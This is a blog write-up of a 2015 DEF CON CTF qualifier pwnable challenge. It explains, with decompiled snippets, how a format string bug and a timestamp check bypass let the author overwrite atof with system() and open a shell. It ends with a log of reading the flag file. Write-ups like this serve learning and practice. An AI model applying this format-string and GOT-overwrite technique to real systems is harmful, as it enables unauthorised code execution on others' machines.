---
layout: post
title: "DEF CON CTF Qualifier 2015 wibbly wobbly timey wimey writeup"
date: 2015-05-23 15:56:33 +0800
comments: true
#published: false
categories: [ctf, writeup, defcon, 2015]
---

This is my second time participating in DC qualifier, and it is really a fun experience.

This challenge ([download](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/wibbly-wobbly-timey-wimey)) involves multiple steps. When we connect to the server, we need to play a game first. 
<!-- more -->
```
alpha@alpha-th:~$ nc wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me 2606
You(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!
   012345678901234567890
00                    E
01                     
02  A                  
03               A     
04 A                   
05                     
06               A     
07                A    
08                     
09        V       A    
10                  A  
11                A    
12              A      
13                     
14       A      A      
15                     
16                     
17                     
18                     
19                     
Your move (w,a,s,d,q):
```
If we win the game five times, then we are asked to input a "TARDIS KEY". If the input is correct, then "Welcome to the TARDIS!" is displayed and we can choose from two options. 
```
TARDIS KEY: 
Welcome to the TARDIS!
Your options are: 
1. Turn on the console
2. Leave the TARDIS
Selection:
```

This is where we start looking for vulnerabilities. 

In IDA, if we look at the routine sub\_E3E, we can see that there is another option ("Dematerialize") besides the two above.
``` c routine sub_E3E
int sub_E3E()
{
  puts("Your options are: ");
  puts("1. Turn on the console");
  puts("2. Leave the TARDIS");
  if ( unk_50AC )
    puts("3. Dematerialize");
  printf("Selection: ");
  return fflush(stdout);
}
```

However, in order to display the option, we need to make the variable "unk\_50AC" true. This happens in the routine sub\_1205:
``` c snippet from routine sub_1205
if ( LOBYTE(dword_50B0[0]) == 49 )        // 1
{
    LOBYTE(v4) = sub_E08();
    if ( v4 )
    {
        printf("The TARDIS console is online!");
        unk_50AC = 1;
        fflush(stdout);
    }
    else
    {
        printf("Access denied except between %s and %s\n", &v7, &v8);
        fflush(stdout);
    }
}
```

When we select the first option ("Turn on the console"), routine sub\_E08 gets called and a comparison is made based on two timestamps:
``` c routine sub_E08
BOOL sub_E08()
{
  return dword_50A4 > 1431907180 && dword_50A4 <= 1431907199;
}
```
If the variable dword\_50A4 does not fit between the two values, then "Access denied except between May 17 2015 23:59:40 GMT and May 18 2015 00:00:00 GMT" is displayed. If it fits, then we can choose the third option ("Dematerialize"), and routine sub\_1027 gets called:
``` c snippet from routine sub_1205
if ( LOBYTE(dword_50B0[0]) == 51 )      // 3
{
    if ( unk_50AC )
    {
        sub_1027();
    }
    else
    {
        puts("Invalid");
        fflush(stdout);
    }
}
```

``` c snippet from routine sub_1027
int sub_1027()
{
    ...
    while ( 1 )
    {
        ...
        v0 = atof(&s);
        v3 = atof(nptr + 1);
        printf("%f, %f\n", v0, v3);
        if ( 51.492137 != v0 || -0.192878 != v3 )
            break;
        printf("Coordinate ");
        printf(&s);
        ...
    }
    printf("You safely travel to coordinates %s\n", &s);
    ...
    return result;
}
```

Does "printf(&s)" look suspicious? It could be an [uncontrolled format string](http://en.wikipedia.org/wiki/Uncontrolled_format_string)! Since the buffer itself can be accessed (with enough "%x", for example), we can pretty much do arbitrary read and write in the memory. But what should we write and where should we write to?  It turns outs we do not need to look far: since "&s" is passed as a parameter to atof() function, we can replace the address of atof() with the address of system() in relocation table. Then we can execute any commands we want (e.g. sh). The address of atof() can be accessed from the function's relocation table entry at run time, so we can exploit the format string vulnerabiliry to overwrite it.

Now there is only one thing left: how do we defeat the timestamp check in the routine sub\_E08 above? If we look at the routine sub\_BCB, the variable dword\_50A4 (which is used for timestamp comparison) can be controlled if we can controlled dword\_50B0.

``` c snippet from routine sub_BCB
size_t sub_BCB()
{
    ...
    v3 = read(dword_50B0[2], &buf, 4u);
    if ( v3 == 4 )
        dword_50A4 = buf;
    ...
}
```
Luckily, in routine sub\_1205, we can read up to 9 bytes into the location pointed to by dword\_50B0, which gives us the control of one byte in dword\_50B0[2]:
``` c snippet from routine sub_1205
if ( read(0, dword_50B0, 9u) <= 0 )
        break;
```

In other words, when we are asked to selected an option, if our input is something like "1aaaaaaa\x00"(9 bytes in total, and the last byte is 0x00), then we will be able to read four bytes from standard input into the location pointed to by "buf", and those four bytes will be treated as an integer and assigned to dword\_50A4, which is used for the timestamp check.


In summary, in order to get the flag, we need to perform the following steps:

* win the game five times
* input correct "TARDIS KEY"
* input "1aaaaaaa\x00"(or something similar) to set the array dword\_50B0
* input four bytes to set the variable dword\_50A4 so that it is something between 1431907180 and 1431907199 when treated as an integer
* select the option "Dematerialize", and use the format string vulnerability to reveal the address of system()
* overwrite the address of atof() with the address of system() in relocation table by using the format string vulnerability
* when asked to input coordinates again, we can open a shell by inputing ",sh"


For playing the game, I use a very simple algorithm: going vertically first to get into the same row as the target, then going horizontally (or going horizontally first then going vertically). This does not succeed every time, but it has a good chance to go through five times in a row (We can play multiple times, right?). The "TARDIS KEY" comes directly from the binary, so it is fixed every time. We can get this byte by byte from gdb, and it is: UeSlhCAGEp.

Here are the code and the result:
{% include_code defcon2015/wwtw.py %}

``` plain
alpha@alpha-th:~$ python wwtw.py
...
...
f774b082 is occupied by another TARDIS.  Materializing there would rip a hole in time and space. Choose again.  
Coordinates: ,sh
sh: 1: ,sh: not found

Unauthorized occupant detected...goodbye
id
uid=1001(wwtw) gid=1001(wwtw) groups=1001(wwtw)
cat /home/wwtw/flag
The flag is: Would you like a Jelly Baby? !@()*ASF)9UW$askjal
```
